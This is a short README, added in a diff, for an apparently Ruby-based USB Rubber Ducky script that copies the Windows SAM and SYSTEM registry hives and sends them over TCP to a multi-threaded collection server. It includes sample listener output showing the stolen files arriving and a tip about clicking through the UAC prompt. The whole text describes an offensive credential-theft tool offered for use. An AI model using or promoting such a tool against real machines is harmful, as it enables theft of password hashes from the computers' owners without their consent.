@@ -1,0 +1,16 @@
+A ducky script that grabs the sam and system reg and then pushes it to a server through tcp.
+
+ruby ducky_hashdump_tcp.rb 
+[!] Enter the host ip to listen on: 192.168.1.202
+[+] Using 192.168.1.202 as server
+[!] Enter the port you would like to use or leave blank for [443]: 
+[+] Using 443
+[!] Would you like to set up the server now?[yes/no] yes
+[*] Starting Server!
+[+] Got sam file!
+[+] Got sys file!
+
+The server that is setup is multi threaded so you can collect reg files from multiple computers or servers.
+
+
+Make sure you click on the UAC pop up for the ducky to click yes!
